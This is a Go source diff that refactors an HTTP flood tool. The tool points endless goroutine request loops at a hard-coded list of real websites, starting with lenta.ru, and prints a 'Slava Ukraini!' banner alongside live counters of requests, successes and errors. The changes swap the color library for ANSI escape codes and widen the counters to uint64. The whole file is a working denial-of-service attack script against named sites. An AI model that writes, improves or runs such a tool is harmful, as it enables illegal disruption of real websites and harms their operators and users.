@@ -3,17 +3,23 @@ package main
 import (
 	"fmt"
 	"runtime"
-	"strconv"
 	"sync/atomic"
 	"time"
 
-	"github.com/gookit/color"
 	"github.com/valyala/fasthttp"
 )
 
 var client = fasthttp.Client{MaxConnsPerHost: 999999}
-var count int32
-var errors int32
+var count uint64
+var errors uint64
+
+var (
+	red    = "\033[1;31m"
+	green  = "\033[1;32m"
+	yellow = "\033[1;33m"
+	teal   = "\033[1;36m"
+	reset  = "\033[0m"
+)
 
 var urls = [51]string{
 	"https://lenta.ru/",
@@ -77,7 +83,7 @@ func main() {
 			go func(url string) {
 				for {
 					sendRequest(url)
-					atomic.AddInt32(&count, 1)
+					atomic.AddUint64(&count, 1)
 				}
 			}(url)
 		}
@@ -90,16 +96,18 @@ func main() {
 	for {
 		time.Sleep(500 * time.Millisecond)
 
-		timeElapsed := float32(time.Since(startTime).Round(1*time.Second)) / 1000000000
+		timeElapsed := float64(time.Since(startTime).Round(1*time.Second)) / 1000000000
 
 		fmt.Print("\033[H\033[2J")
-		fmt.Println(color.Cyan.Render("Slava ") + color.Yellow.Render("Ukraini!") + "\n")
-		fmt.Println("Requests/s: " + color.Yellow.Render(strconv.Itoa(int(float32(count)/timeElapsed))))
-		fmt.Println("Total requests: " + color.Yellow.Render(strconv.Itoa(int(count))))
-		fmt.Println("Successfull requests: " + color.Green.Render(strconv.Itoa(int(count-errors))))
-		fmt.Println("Successfull requests/s: " + color.Green.Render(strconv.Itoa(int(float32(count-errors)/timeElapsed))))
-		fmt.Println("Errors: " + color.Red.Render(strconv.Itoa(int(errors))))
-		fmt.Println("Time elapsed: " + color.Cyan.Render(time.Since(startTime).Round(1*time.Second)))
+		fmt.Println(teal + "Slava " + yellow + "Ukraini!" + reset + "\n")
+		fmt.Printf("Requests/s: "+yellow+"%d"+reset+"\n", uint64(float64(count)/timeElapsed))
+		fmt.Printf("Total requests: "+yellow+"%d"+reset+"\n", count)
+		fmt.Printf("Successfull requests: "+green+"%d"+reset+"\n", count-errors)
+		fmt.Printf("Successfull requests/s: "+green+"%d"+reset+"\n", uint64(float64(count-errors)/timeElapsed))
+		fmt.Printf("Errors: "+red+"%d"+reset+"\n", errors)
+		fmt.Print("Time elapsed: " + teal)
+		fmt.Print(time.Since(startTime).Round(1 * time.Second))
+		fmt.Print(reset + "\n")
 	}
 }
 
@@ -111,7 +119,7 @@ func sendRequest(host string) {
 	err := client.Do(req, res)
 
 	if err != nil {
-		atomic.AddInt32(&errors, 1)
+		atomic.AddUint64(&errors, 1)
 	}
 
 	fasthttp.ReleaseRequest(req)
